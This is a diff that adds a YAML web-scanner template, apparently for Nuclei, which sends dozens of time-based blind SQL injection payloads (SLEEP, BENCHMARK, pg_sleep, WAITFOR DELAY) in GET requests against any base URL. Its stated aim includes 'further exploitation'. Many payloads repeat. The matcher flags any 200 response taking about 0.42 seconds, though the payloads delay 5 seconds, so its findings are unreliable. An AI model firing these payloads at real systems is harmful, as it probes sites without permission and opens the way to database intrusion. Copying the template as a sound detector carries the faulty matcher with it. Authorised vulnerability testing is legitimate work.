@@ -1,0 +1,78 @@
+id: time-based-sql-injection
+
+info:
+  name: time-based-sql-injection
+  author: Daniyell
+  severity: high
+  description: This template tries to detect GET parameters with time delay, hopefully for further exploitation if necessary, always check the final payload via burspsuit. Next will be the POST base.
+  tags: Time-base-SQLi, Blind-SQLi-Detected
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}1-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))'
+      - '{{BaseURL}}if(now()=sysdate(),sleep(5),0)'
+      - '{{BaseURL}}(select(0)from(select(sleep(5)))v)/*%27+(select(3)from(select(sleep(5)))v)+%27%22+(select(0)from(select(sleep(5)))v)+%22*/'
+      - '{{BaseURL}}1-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))'
+      - '{{BaseURL}}%27XOR(if(now()=sysdate(),sleep(5*1),0))XOR%27Z'
+      - '{{BaseURL}}1%20or%20sleep(5)%23'
+      - '{{BaseURL}}benchmark(5000000,MD5(1))AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337'
+      - '{{BaseURL}}pg_sleep(5)'
+      - '{{BaseURL}}benchmark(5000000,MD5(1))-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))'
+      - '{{BaseURL}}benchmark(5000000,MD5(1))AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)'
+      - "{{BaseURL}}%3bwaitfor+delay+'0%3a0%3a5'--"
+      - "{{BaseURL}}'+WAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'%3bWAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'+WAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'%3bWAITFOR+DELAY+'0%3a0%3a5'--"
+      - '{{BaseURL}}%27|%20|pg_sleep(5)'
+      - "{{BaseURL}}|+|pg_sleep(5)--"
+      - '{{BaseURL}}+or+sleep(5)%3d'
+      - '{{BaseURL}}benchmark(5000000,MD5(1))OR%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337'
+      - "{{BaseURL}}%3bwaitfor+delay+'0%3a0%3a5'--"
+      - "{{BaseURL}})%3bwaitfor+delay+'0%3a0%3a5'--"
+      - "{{BaseURL}}'%3bwaitfor+delay+'0%3a0%3a5'--"
+      - '{{BaseURL}}1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YYYY)%20AND%20%27%%27=%27'
+      - '{{BaseURL}}1%27XOR(if(now()=sysdate(),sleep(5),0))OR%27'
+      - '{{BaseURL}}1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)-1337'
+      - "{{BaseURL}}1%20and%20sleep(5)--"
+      - "{{BaseURL}}(select*from(select(sleep(20)))a)"
+      - "{{BaseURL}}1%20and%20sleep(5)"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)#%201337"
+      - "{{BaseURL}}1-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)#%201337"
+      - "{{BaseURL}}benchmark(5000000,MD5(1))#"
+      - "{{BaseURL}}+or+pg_sleep(5)--"
+      - "{{BaseURL}}1%20and%20sleep(5)--"
+      - '{{BaseURL}}1%20and%20sleep(5)'
+      - '{{BaseURL}}%27%20WAITFOR%20DELAY%20%270:0:5%27--'
+      - '{{BaseURL}}+or+sleep(5)%3d'
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337"
+      - "{{BaseURL}}%3bwaitfor+delay+'0%3a0%3a5'--"
+      - "{{BaseURL}}'+WAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'%3bWAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'+WAITFOR+DELAY+'0%3a0%3a5'--"
+      - "{{BaseURL}}'%3bWAITFOR+DELAY+'0%3a0%3a5'--"
+      - '{{BaseURL}}%%27;SELECT%20PG_SLEEP(5)--'
+      - "{{BaseURL}}(WAITFOR DELAY '0:0:5')--"
+      - "{{BaseURL}}XOR(if(now()=sysdate(),sleep(5),0))OR%27"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)#%201337"
+      - "{{BaseURL}}1-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))"
+      - "{{BaseURL}}1%20and%20sleep(5)--"
+      - "{{BaseURL}}1%20and%20sleep(5)"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)#%201337"
+      - "{{BaseURL}}1-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))"
+      - "{{BaseURL}}1%20and%20sleep(5)--"
+      - '{{BaseURL}}1%20and%20sleep(5)'
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)--%201337"
+      - "{{BaseURL}}11%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))YYYY)#%201337"
+      - "{{BaseURL}}benchmark(5000000,MD5(1))#"
+      - "{{BaseURL}}+or+pg_sleep(5)--"
+      - "{{BaseURL}}(WAITFOR DELAY '0:0:5')--"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && duration>=0.423495694'
